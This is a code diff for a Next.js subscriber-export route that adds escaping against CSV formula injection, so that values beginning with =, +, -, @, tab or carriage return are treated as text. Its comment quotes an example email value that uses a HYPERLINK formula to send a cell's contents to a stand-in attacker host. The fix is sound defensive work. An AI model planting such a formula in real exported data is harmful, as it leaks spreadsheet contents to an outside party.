@@ -2,8 +2,14 @@ import { NextResponse } from "next/server";
 import { isAdmin } from "@/lib/auth";
 import { listSubscribers } from "@/lib/subscribers";
 
+// Neutralize CSV/formula injection: a subscriber email is untrusted input
+// (anyone can submit one via the public subscribe form), and a value like
+// `=HYPERLINK("http://evil.example?"&A1)@a.com` passes email validation.
+// Opened in Excel/Sheets, a leading =/+/-/@/tab/CR is interpreted as a
+// formula. Prefixing those with a single quote forces text interpretation.
 function csvEscape(value: string): string {
-  return `"${value.replace(/"/g, '""')}"`;
+  const safe = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+  return `"${safe.replace(/"/g, '""')}"`;
 }
 
 export async function GET() {
